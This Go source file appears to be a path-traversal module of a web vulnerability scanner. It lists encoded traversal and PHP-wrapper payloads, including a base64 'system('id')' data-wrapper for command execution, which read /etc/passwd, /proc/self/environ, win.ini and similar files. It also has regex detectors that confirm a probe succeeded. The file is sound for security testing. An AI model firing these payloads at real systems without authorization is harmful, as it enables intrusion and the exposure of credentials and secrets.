package deeptraversal

import (
	"encoding/base64"
	"html"
	"regexp"
	"strings"
)

// Payload is a path traversal probe with WAF-bypass encoding variant.
type Payload struct {
	Value   string
	Variant string
	Signal  string
	OS      string // "linux" or "windows"
}

// PayloadsLinux returns Linux path traversal probes.
func PayloadsLinux() []Payload {
	return []Payload{
		{Value: `../../../../etc/passwd`, Variant: "traversal", Signal: "linux_passwd", OS: "linux"},
		{Value: `../../../../../../../../etc/passwd`, Variant: "traversal_deep", Signal: "linux_passwd", OS: "linux"},
		{Value: `..%2f..%2f..%2f..%2fetc%2fpasswd`, Variant: "url_encoded", Signal: "linux_passwd", OS: "linux"},
		{Value: `..%252f..%252f..%252f..%252fetc%252fpasswd`, Variant: "double_url_encoded", Signal: "linux_passwd", OS: "linux"},
		{Value: `%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd`, Variant: "encoded_dots", Signal: "linux_passwd", OS: "linux"},
		{Value: `..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afpasswd`, Variant: "utf8_overlong", Signal: "linux_passwd", OS: "linux"},
		{Value: `....//....//....//etc/passwd`, Variant: "nested_filter", Signal: "linux_passwd", OS: "linux"},
		{Value: `../../../../etc/passwd%00.jpg`, Variant: "null_byte_extension", Signal: "linux_passwd", OS: "linux"},
		{Value: `/etc/passwd/./`, Variant: "dot_slash", Signal: "linux_passwd", OS: "linux"},
		{Value: `/etc/./passwd`, Variant: "dot_in_path", Signal: "linux_passwd", OS: "linux"},
		{Value: `....\/....\/....\/etc/passwd`, Variant: "mixed_slash", Signal: "linux_passwd", OS: "linux"},
		{Value: `../../../../../../../../etc/issue`, Variant: "traversal_issue", Signal: "linux_issue", OS: "linux"},
		{Value: `../../../../../../../../etc/os-release`, Variant: "traversal_os_release", Signal: "linux_os_release", OS: "linux"},
		{Value: `../../../../../../../../proc/self/environ`, Variant: "traversal_proc_environ", Signal: "linux_proc_environ", OS: "linux"},
		{Value: `../../../../../../../../proc/self/cmdline`, Variant: "traversal_proc_cmdline", Signal: "linux_proc_cmdline", OS: "linux"},
		{Value: `../../../../../../../../proc/version`, Variant: "traversal_proc_version", Signal: "linux_proc_version", OS: "linux"},
		{Value: `../../../../../../../../proc/self/maps`, Variant: "traversal_proc_maps", Signal: "linux_proc_maps", OS: "linux"},
		{Value: `php://filter/convert.base64-encode/resource=../../../../etc/passwd`, Variant: "php_filter_base64", Signal: "linux_passwd_base64", OS: "linux"},
		{Value: `php://filter/read=string.rot13/resource=../../../../etc/passwd`, Variant: "php_filter_rot13", Signal: "linux_passwd", OS: "linux"},
		{Value: `data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==`, Variant: "php_data_wrapper", Signal: "command_output", OS: "linux"},
		{Value: `expect://id`, Variant: "php_expect_wrapper", Signal: "command_output", OS: "linux"},
		{Value: `php://input`, Variant: "php_input_wrapper", Signal: "command_output", OS: "linux"},
		{Value: `file:///etc/passwd`, Variant: "file_url_scheme", Signal: "linux_passwd", OS: "linux"},
		{Value: `..%252e%252e%252fetc%252fpasswd`, Variant: "double_url_dots_slash", Signal: "linux_passwd", OS: "linux"},
		{Value: `..%c1%9c..%c1%9cetc/passwd`, Variant: "unicode_utf8_c1_9c", Signal: "linux_passwd", OS: "linux"},
		{Value: `/var/www/html/../../../../etc/passwd`, Variant: "webroot_relative", Signal: "linux_passwd", OS: "linux"},
		// Java/Tomcat-specific normalization bypass
		{Value: `..;/..;/..;/..;/etc/passwd`, Variant: "tomcat_semicolon", Signal: "linux_passwd", OS: "linux"},
		{Value: `..;/..;/..;/..;/..;/..;/etc/passwd`, Variant: "tomcat_semicolon_deep", Signal: "linux_passwd", OS: "linux"},
	}
}

// PayloadsWindows returns Windows path traversal probes.
func PayloadsWindows() []Payload {
	return []Payload{
		{Value: `..\..\..\..\windows\win.ini`, Variant: "win_backslash", Signal: "windows_ini", OS: "windows"},
		{Value: `..\..\..\..\..\..\..\..\windows\system32\drivers\etc\hosts`, Variant: "win_hosts_deep", Signal: "windows_hosts", OS: "windows"},
		{Value: `..\..\..\..\..\..\..\..\windows\win.ini`, Variant: "win_ini_deep", Signal: "windows_ini", OS: "windows"},
		{Value: `../../../../../../../../windows/win.ini`, Variant: "win_deep_forward_slash", Signal: "windows_ini", OS: "windows"},
		{Value: `..\\..\\..\\..\\windows\\win.ini`, Variant: "win_escaped", Signal: "windows_ini", OS: "windows"},
		{Value: `..\\..\\..\\..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts`, Variant: "win_hosts_escaped_deep", Signal: "windows_hosts", OS: "windows"},
		{Value: `....\\....\\windows\\win.ini`, Variant: "win_nested", Signal: "windows_ini", OS: "windows"},
		{Value: `C:\windows\win.ini`, Variant: "win_absolute", Signal: "windows_ini", OS: "windows"},
		{Value: `c:/windows/win.ini`, Variant: "win_forward_slash", Signal: "windows_ini", OS: "windows"},
		{Value: `file:///c:/windows/win.ini`, Variant: "win_file_scheme", Signal: "windows_ini", OS: "windows"},
		{Value: `..%5c..%5c..%5c..%5cwindows%5cwin.ini`, Variant: "win_url_encoded", Signal: "windows_ini", OS: "windows"},
		{Value: `..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts`, Variant: "win_hosts_url_encoded", Signal: "windows_hosts", OS: "windows"},
		{Value: `..%255c..%255c..%255cwindows%255cwin.ini`, Variant: "win_double_url_encoded", Signal: "windows_ini", OS: "windows"},
		{Value: `..%255c..%255c..%255c..%255c..%255c..%255cwindows%255csystem32%255cdrivers%255cetc%255chosts`, Variant: "win_hosts_double_url_encoded", Signal: "windows_hosts", OS: "windows"},
		{Value: `%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini`, Variant: "win_encoded_dots", Signal: "windows_ini", OS: "windows"},
		{Value: `..\..\..\..\windows\system32\drivers\etc\hosts`, Variant: "win_hosts", Signal: "windows_hosts", OS: "windows"},
		{Value: `C:\Windows\System32\drivers\etc\hosts`, Variant: "win_hosts_absolute", Signal: "windows_hosts", OS: "windows"},
		{Value: `c:\windows\system32\drivers\etc\hosts`, Variant: "win_hosts_lower_drive", Signal: "windows_hosts", OS: "windows"},
		{Value: `..\..\..\..\boot.ini`, Variant: "win_boot_ini", Signal: "windows_boot", OS: "windows"},
		{Value: `..\..\..\..\..\..\..\..\boot.ini`, Variant: "win_boot_ini_deep", Signal: "windows_boot", OS: "windows"},
		{Value: `..\\..\\..\\..\\windows\\win.ini%00.jpg`, Variant: "win_null_byte", Signal: "windows_ini", OS: "windows"},
		{Value: `....//....//windows/win.ini`, Variant: "win_mixed_slash", Signal: "windows_ini", OS: "windows"},
		{Value: `/windows/win.ini`, Variant: "win_leading_slash", Signal: "windows_ini", OS: "windows"},
		{Value: `\\127.0.0.1\c$\windows\win.ini`, Variant: "win_unc_path", Signal: "windows_ini", OS: "windows"},
	}
}

// Payloads returns Linux and Windows probes interleaved so both OS families are exercised.
func Payloads() []Payload {
	return MergeBalanced(PayloadsLinux(), PayloadsWindows())
}

// MergeBalanced interleaves two probe lists so neither OS is starved during scanning.
func MergeBalanced(linux, windows []Payload) []Payload {
	maxLen := len(linux)
	if len(windows) > maxLen {
		maxLen = len(windows)
	}
	out := make([]Payload, 0, len(linux)+len(windows))
	for i := 0; i < maxLen; i++ {
		if i < len(windows) {
			out = append(out, windows[i])
		}
		if i < len(linux) {
			out = append(out, linux[i])
		}
	}
	return out
}

var (
	markupRE        = regexp.MustCompile(`(?s)<[^>]*>`)
	passwdEntryRE   = regexp.MustCompile(`(?m)^[ \t]*root:[^:\r\n]*:0:0:[^:\r\n]*:[^:\r\n]*:[^:\r\n]*[ \t]*$`)
	base64RunRE     = regexp.MustCompile(`[A-Za-z0-9+/]{24,}={0,2}`)
	procMapsLineRE  = regexp.MustCompile(`(?m)^[0-9a-f]{4,}-[0-9a-f]{4,}\s+[rwxps-]{4}\s+[0-9a-f]+\s+[0-9a-f]{2}:[0-9a-f]{2}\s+\d+`)
	procUIDGIDRE    = regexp.MustCompile(`(?i)\buid=\d+(?:\([^)]*\))?\s+gid=\d+`)
	procEnvPathRE   = regexp.MustCompile(`(?i)(?:^|\x00)PATH=[^\x00]+`)
	procEnvHomeRE   = regexp.MustCompile(`(?i)(?:^|\x00)HOME=[^\x00]+`)
	procVersionRE   = regexp.MustCompile(`(?im)^linux version [0-9][^\r\n]*(?:gcc|clang) version [0-9]`)
	osReleaseIDRE   = regexp.MustCompile(`(?m)^id=["']?[a-z0-9._-]+["']?\s*$`)
	osReleaseNameRE = regexp.MustCompile(`(?m)^name=["'][^\r\n]+["']\s*$`)
	osReleaseVerRE  = regexp.MustCompile(`(?m)^version_id=["'][^\r\n]+["']\s*$`)
	linuxIssueRE    = regexp.MustCompile(`(?im)^(?:ubuntu|debian gnu/linux|alpine linux|centos linux|red hat enterprise linux)[^\r\n]*[0-9][^\r\n]*`)
	winLoopbackRE   = regexp.MustCompile(`(?im)^\s*(?:127\.0\.0\.1|::1)\s+localhost\b`)
	winFontRE       = regexp.MustCompile(`(?m)^\s*[^=\r\n]+\.fon\s*=`)
	winBootEntryRE  = regexp.MustCompile(`(?im)^\s*(?:default=|multi\()`)
)

// DetectSignal reports whether a traversal probe succeeded against baseline.
func DetectSignal(body, baseline, signal string) bool {
	text := normalizedFileText(body)
	base := normalizedFileText(baseline)
	switch {
	case strings.HasPrefix(signal, "linux_passwd_base64"):
		return hasBase64PasswdEntry(body) && !hasBase64PasswdEntry(baseline)
	case signal == "linux_passwd":
		return hasPasswdEntry(text) && !hasPasswdEntry(base)
	case signal == "linux_proc_version":
		return hasLinuxProcVersion(text) && !hasLinuxProcVersion(base)
	case signal == "linux_proc_maps":
		return procMapsLineRE.MatchString(text) && !procMapsLineRE.MatchString(base)
	case signal == "linux_proc_environ":
		return hasProcEnvironment(text) && !hasProcEnvironment(base)
	case signal == "linux_proc_cmdline":
		return hasProcCommandLine(text) && !hasProcCommandLine(base)
	case signal == "linux_proc":
		return hasLinuxProcVersion(text) && !hasLinuxProcVersion(base) ||
			procMapsLineRE.MatchString(text) && !procMapsLineRE.MatchString(base) ||
			hasProcEnvironment(text) && !hasProcEnvironment(base) ||
			hasProcCommandLine(text) && !hasProcCommandLine(base)
	case signal == "linux_os_release":
		return hasOSRelease(text) && !hasOSRelease(base)
	case signal == "linux_issue":
		return hasLinuxIssue(text) && !hasLinuxIssue(base)
	case signal == "command_output":
		return procUIDGIDRE.MatchString(text) && !procUIDGIDRE.MatchString(base)
	case strings.HasPrefix(signal, "windows_hosts"):
		return hasWindowsHosts(text) && !hasWindowsHosts(base)
	case strings.HasPrefix(signal, "windows_ini"):
		return hasWindowsINI(text) && !hasWindowsINI(base)
	case strings.HasPrefix(signal, "windows_boot"):
		return hasWindowsBoot(text) && !hasWindowsBoot(base)
	default:
		// Unknown or generic traversal signals have no file-content proof.
		return false
	}
}

func normalizedFileText(body string) string {
	text := strings.ToLower(html.UnescapeString(body))
	text = strings.ReplaceAll(text, "<br>", "\n")
	text = strings.ReplaceAll(text, "<br/>", "\n")
	text = strings.ReplaceAll(text, "<br />", "\n")
	text = strings.ReplaceAll(text, "</p>", "\n")
	text = strings.ReplaceAll(text, "</div>", "\n")
	text = markupRE.ReplaceAllString(text, " ")
	return strings.ReplaceAll(text, "\r", "")
}

func hasPasswdEntry(text string) bool {
	return passwdEntryRE.MatchString(text)
}

func hasBase64PasswdEntry(text string) bool {
	for _, encoded := range base64RunRE.FindAllString(text, -1) {
		decoded, err := base64.StdEncoding.DecodeString(encoded)
		if err != nil {
			decoded, err = base64.RawStdEncoding.DecodeString(strings.TrimRight(encoded, "="))
		}
		if err == nil && hasPasswdEntry(normalizedFileText(string(decoded))) {
			return true
		}
	}
	return false
}

func hasLinuxProcVersion(text string) bool {
	return procVersionRE.MatchString(text)
}

func hasProcEnvironment(text string) bool {
	return strings.ContainsRune(text, '\x00') && procEnvPathRE.MatchString(text) && procEnvHomeRE.MatchString(text)
}

func hasProcCommandLine(text string) bool {
	separator := strings.IndexByte(text, '\x00')
	if separator <= 1 || text[0] != '/' {
		return false
	}
	return !strings.ContainsAny(text[:separator], " \t\r\n<>")
}

func hasOSRelease(text string) bool {
	return osReleaseIDRE.MatchString(text) && osReleaseNameRE.MatchString(text) && osReleaseVerRE.MatchString(text)
}

func hasLinuxIssue(text string) bool {
	return linuxIssueRE.MatchString(text)
}

func hasWindowsHosts(text string) bool {
	hasLoopback := winLoopbackRE.MatchString(text)
	hasWindowsCopyright := strings.Contains(text, "microsoft corp")
	hasBothMappings := strings.Contains(text, "127.0.0.1 localhost") && strings.Contains(text, "::1 localhost")
	return hasLoopback && (hasWindowsCopyright || hasBothMappings)
}

func hasWindowsINI(text string) bool {
	extensions := strings.Contains(text, "[extensions]") && strings.Contains(text, "for 16-bit app support")
	fonts := strings.Contains(text, "[fonts]") && winFontRE.MatchString(text)
	return extensions || fonts
}

func hasWindowsBoot(text string) bool {
	return strings.Contains(text, "[boot loader]") && strings.Contains(text, "[operating systems]") &&
		winBootEntryRE.MatchString(text)
}
